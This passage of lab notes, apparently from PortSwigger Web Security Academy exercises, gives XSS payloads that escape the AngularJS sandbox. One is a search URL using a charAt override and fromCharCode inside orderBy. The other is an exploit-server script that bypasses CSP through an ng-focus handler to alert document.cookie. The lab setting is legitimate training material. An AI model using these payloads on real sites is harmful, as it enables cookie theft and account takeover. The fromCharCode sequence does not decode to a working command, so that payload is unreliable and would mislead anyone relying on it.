# This lab uses AngularJS in an unusual way where the $eval function is not available and you will be unable to use any strings in AngularJS.

# To solve the lab, perform a cross-site scripting attack that escapes the sandbox and executes the alert function without using the $eval function.

[123]|orderBy:'Some string'

Enter into search:

https://acf61f0a1e6e5c56c08e03a100330080.web-security-academy.net/?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,66,97,108,122,114,110,28,48,41)=1

```

### Reflected XSS with AngularJS sandbox escape and CSP
```bash

# This lab uses CSP and AngularJS.

# To solve the lab, perform a cross-site scripting attack that bypasses CSP, escapes the AngularJS sandbox, and alerts document.cookie.

"Search term cannot exceed 70 characters"

Go to: "Exploit server"

<script>
location='https://ac361f8b1e9bcd52c0d388bf00a60052.web-security-academy.net/?search=%3cinput%20id=x%20ng-focus=$event.path|orderBy:%27(z=alert)(document.cookie)%27%3E#x';
</script>

// or // decoded

<script>
location='https://ac361f8b1e9bcd52c0d388bf00a60052.web-security-academy.net/?search=<input id=x ng-focus=$event.path|orderBy:'(z=alert)(document.cookie)'>#x';
</script>

```

#hacking
